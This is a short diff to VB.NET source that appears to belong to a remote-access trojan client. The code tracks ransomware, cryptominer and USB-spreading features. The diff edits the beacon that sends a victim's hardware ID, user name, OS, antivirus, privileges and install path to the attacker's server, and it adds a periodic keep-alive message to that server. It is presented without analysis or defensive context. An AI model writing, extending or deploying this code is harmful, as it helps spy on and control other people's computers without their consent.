@@ -108,7 +108,7 @@ re:
                 Alive = True
                 MS = New IO.MemoryStream
 
-                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.4", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
+                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.4A", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
                                   C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, "...", SPL, " ", SPL,
                                   C_ID.Privileges.ToString, SPL, C_Settings.fullpath, SPL, Environment.ProcessorCount))
 
@@ -144,6 +144,7 @@ re:
         Public Shared P_Stop As Boolean = False
         Public Shared P_Start As Boolean = False
         Public Shared i As Integer = 0
+        Public Shared KAP As Integer = 0
         Public Shared Sub PING()
             Try
                 If P_Start Then
@@ -154,6 +155,8 @@ re:
                         i = 0
                     End If
                 End If
+
+                KAP += 1 : If KAP > 3000 Then KAP = 0 : Send("KA")
             Catch : End Try
         End Sub
 
